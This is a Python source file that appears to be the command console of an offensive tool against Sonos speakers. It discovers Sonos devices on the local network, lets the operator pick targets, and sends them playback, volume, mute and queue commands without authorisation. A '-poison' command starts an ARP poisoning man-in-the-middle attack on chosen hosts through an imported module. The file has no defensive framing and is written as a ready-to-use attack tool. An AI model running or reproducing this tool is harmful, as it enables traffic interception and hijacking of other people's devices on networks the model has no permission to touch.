from SonosDetector import *
from SonosCommander import *
from SonosPoisoner import *

from scapy.all import *

def formatCommands(command, params, targets):
	# change volumes for all targets
	if command == "setvolume":
		params_dict = {"volume":str(params[0])}
	elif command == "setmute":
		params_dict = {"mute":str(params[0])}

	elif command == "playuri":
		params_dict = {"uri":str(params[0])}
	elif command == "addsongtoqueue":
		params_dict = {"uri":str(params[0])}
	elif command == "addplaylisttoqueue":
		if len(params) > 1:
			title = " ".join(params[1:])
		else:
			title = "Sp00ky Sc4ry Sk3l3t0n!"
		params_dict = {"uri":str(params[0]), "title": title}

	
	elif command == "seektime":
		params = tuple([int(p) for p in params])
		if len(params) == 3:
			time = "{0:01d}:{1:02d}:{2:02d}".format(*params)
		elif len(params) == 2:
			time = "0:{0:02d}:{1:02d}".format(*params)
		elif len(params) == 1:
			time = "0:00:{:02d}".format(params[0])
		params_dict = {"time":time}
	elif command == "seekqueue":
		params_dict = {"index":str(params[0])}

	else:
		params_dict = {}

	for ip, info in targets.items():
		params_dict["uuid"] = info["LocalUID"]
		sendCommand(command, params_dict, ip)
		print("Sent " + command + " to " + ip)


def setDevices(clients):
	printDevices(clients)
	target_indices = input("Provide the index of the target devices\n").split(" ")

	targets = []
	for index in target_indices:
		try:
			targets.append(clients[int(index)])
		except:
			print("Index '" + index + "' not found")
			continue
	return targets


def setTargets(sonos_info):
	printSonosInfo(sonos_info)
	target_indices = input("Provide the index of the target devices\n").split(" ")

	targets = {}
	for index in target_indices:
		try:
			ip, info = list(sonos_info.items())[int(index)]
			targets[ip] = dict(info)
		except:
			print("Index '" + index + "' not found")
			continue
	return targets

def getIFace(params):
	if params == []:
		print("Interface set: Default")
		return conf.iface
	iface = " ".join(params)
	print("Interface set: '" + iface + "'")
	return iface

def help():
	print("?h or ?help		show this list\n" +
		"-t or -target		set targets\n" +
		"?t or ?target		show targets\n" +
		"-iface			set interface (used for poisoning)\n" +
		"?iface			show interface (used for poisoning)\n" +
		"-info			refresh devices (incl. Sonos)\n" +
		"?info			show Sonos devices\n" +
		"-refreshcommands	refresh Sonos commands list\n" +
		"?commands		show Sonos commands list\n" +
		"-poison			start ARP poison attack\n" +
		"-stoppoison		stop ARP poison attack\n" +
		"exit			stop the tool")


def main():
	print("Initializing ...")
	iface = conf.iface
	local_ip = get_if_addr(iface)
	local_mac = get_if_hwaddr(iface)
	devices = deviceScan(local_ip)
	sonos_ips = getSonosIPs(devices)
	sonos_info = getSonosInfo(sonos_ips)
	targets = {}
	poison_process = None

	print("Reading Commands ...")

	refreshCommands()
	commands = getCommands()

	while True:
		split = input("Command me!\n").split(" ")
		command = split[0]
		params = split[1:]

		# set target device(s)
		if command == "-target" or command == "-t":
			targets = setTargets(sonos_info)
			print("Targets set: " + str(list(targets.keys())))
		# show current targets
		elif command == "?target" or command == "?t":
			print("Targets are: " + str(list(targets.keys())))

		# refresh the ip addresses
		elif command == "-iface":
			iface = getIFace(params)
		# display the ip addresses
		elif command == "?iface":
			print("Current interface: " + iface)

		# refresh the ip addresses
		elif command == "-info":
			devices = updateDevices(local_ip, devices)
			sonos_ips = getSonosIPs(devices)
			print(str(len(sonos_ips)) + " Sonos devices found")
			sonos_info = getSonosInfo(sonos_ips)
		# display the Sonos info
		elif command == "?info" or command == "?i":
			printSonosInfo(sonos_info)
			

		# refresh available Sonos commands
		elif command == "-refreshcommands":
			refreshCommands()
			commands = getCommands()
		# display available Sonos commands
		elif command == "?commands":
			print("Available Sonos commands are:")
			for cmd in commands:
				print("  " + cmd)


		# execute a Sonos command
		elif command in commands:
			if targets == {}:
				print("No targets, set targets using -t or -target\n")
				continue

			formatCommands(command, params, targets)

		# start ARP poisoning
		elif command == "-poison":
			if poison_process == None:
				poison_process = startPoison(
							iface,
							list(targets.keys()),
							setDevices(devices),
							local_ip,
							local_mac
							)
				print("Started poisoning.")
			else:
				print("Already poisoning.")

		elif command == "-stoppoison":
			if poison_process == None:
				print("Currently not poisoning.")
			else:
				stopPoison(poison_process)
				poison_process = None
				print("Stopped poisoning.")
			

		# display help message (for specific command)
		elif command == "?help" or command == "?h":
			help()
		# exit the tool
		elif command == "exit":
			break
		# invalid command, display basic help
		else:
			print("Invalid command!\n?h for help")
		print()
		
if __name__ == '__main__':
	main()